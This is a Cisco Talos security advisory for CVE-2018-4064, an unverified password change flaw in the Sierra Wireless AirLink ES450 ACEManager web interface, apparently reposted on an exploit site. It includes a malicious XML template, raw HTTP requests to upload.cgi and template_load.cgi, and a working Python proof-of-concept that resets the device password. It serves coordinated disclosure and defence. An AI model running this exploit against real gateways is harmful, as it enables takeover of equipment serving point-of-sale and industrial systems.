@@ -1,0 +1,166 @@
+id: 32609
+date: 04/29/2019
+title: Sierra #Wireless #AirLink ES450 #ACEManager upload.cgi Unverified Password Change Exploit
+author: Cisco Talos
+cves: CVE-2018-4064
+
+Sierra Wireless AirLink ES450 ACEManager upload.cgi Unverified Password Change Exploit
+
+CVE Number
+CVE-2018-4064
+
+Summary
+
+An exploitable unverified password change vulnerability exists in the ACEManager upload.cgi functionality of Sierra Wireless AirLink ES450 FW 4.9.3. A specially crafted HTTP request can cause a unverified device configuration change, resulting in an unverified change of the user password on the device. An attacker can make an authenticated HTTP request to trigger this vulnerability.
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+8.5 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L
+CWE
+
+CWE-620: Unverified Password Change
+
+Details
+
+Sierra Wireless is a wireless communications equipement designer and manufacturer. They provide both embedded solutions as well as wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is a LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting Point-of-sale devices, remote SCADA equipment, or other business critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+Utilizing the template upload capability within the WebUI, an authenticated user can change MSCIID settings without verification. While the normal method of changing the user password requires the old user password, uploading the following XML template allows the authenicated user to change the password without the previous user password.
+Template Data
+
+ <?xml version="1.0" ?>
+ <template>
+    <item msciid="5003" title="User Password" value="password01" />
+ </template>
+
+This can be done by utilizing the the WebUI template upload, or by using the following HTTP requests.
+
+ POST /cgi-bin/upload.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Cookie: token=cab34a8c2f7708f1163a22ed272a7e4f
+ Connection: close
+ Upgrade-Insecure-Requests: 1
+ Content-Type: multipart/form-data; boundary=---------------------------98690229210303203401454887637
+ Content-Length: 624
+
+ -----------------------------98690229210303203401454887637
+ Content-Disposition: form-data; name="save-as-filename"
+
+ SWITemplate.xml
+ -----------------------------98690229210303203401454887637
+ Content-Disposition: form-data; name="file-location"
+
+ ../admin/SWITemplate.xml
+ -----------------------------98690229210303203401454887637
+ Content-Disposition: form-data; name="upload-file"; filename="SWIApplyTemplate.xml"
+ Content-Type: text/xml
+
+ <?xml version="1.0" ?>
+ <template>
+    <item msciid="5003" title="User Password" value="password01" />
+ </template>
+
+ -----------------------------98690229210303203401454887637--
+
+Followed by
+
+ POST /cgi-bin/template_load.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+ Accept: text/plain, */*; q=0.01
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 40
+ Cookie: token=cab34a8c2f7708f1163a22ed272a7e4f
+ Connection: close
+
+ path=/www/auth/user/SWIApplyTemplate.xml
+
+Other MSCIID values can be changed without verification as well, omitting a MSCIID from the template means that the value will remain unchanged from the current state.
+
+This vulnerability was discovered and tested using the AirLink ES450. Most likely this vulnerability also affects the AirLink GX450 product as well.
+
+Exploit Proof of Concept
+
+ #!/usr/bin/env python
+ #Author : Carl Hurd, Cisco Talos
+ import sys
+ import requests
+
+ from requests_toolbelt.utils import dump
+
+ def auth(ip, port, password):
+      data = """<request xmlns="urn:acemanager">
+      <connect>
+      <login>user</login>
+      <password><![CDATA[{}]]></password>
+      </connect>
+      </request>""".format(password)
+
+      response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+      try:
+           cookies = dict(token=response.headers["Set-Cookie"].split("; ")[0][len("token="):])
+           return cookies
+      except:
+           print("Error while authenticating")
+           sys.exit(0)
+
+ def main():
+      if len(sys.argv) < 5 or len(sys.argv) > 5:
+           print("Usage : {} [ip address] [port] [password of user] [absolute path of file to check]".format(sys.argv[0]))
+           sys.exit(0)
+
+      ip = sys.argv[1]
+      port = sys.argv[2]
+      password = sys.argv[3]
+      new_pass = sys.argv[4]
+
+      print("New Password : {}\n".format(new_pass))
+
+      cookies = auth(ip, port, password)
+
+      xml = """<?xml version="1.0" ?>
+      <template>
+           <item msciid="5003" title="User Password" value="{}" />
+      </template>""".format(new_pass)
+
+      files = {'save-as-filename': (None, "SWITemplate.xml"), 'file-location': (None, "../admin/SWITemplate.xml"), 'upload-file': ('SWIApplyTemplate.xml', xml, 'text/xml')}
+      response = requests.post("http://"+ip+":"+port+"/cgi-bin/upload.cgi", cookies=cookies, files=files)
+
+      response = requests.post("http://"+ip+":"+port+"/cgi-bin/template_load.cgi", cookies=cookies, data="path=/www/auth/user/SWIApplyTemplate.xml", headers={"Content-Type": "application/x-www-form-urlencoded"})
+
+      print(response.text)
+
+ if __name__ == "__main__":
+      main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd of Cisco Talos.
+
+#  0day.today [2023-03-27]  #
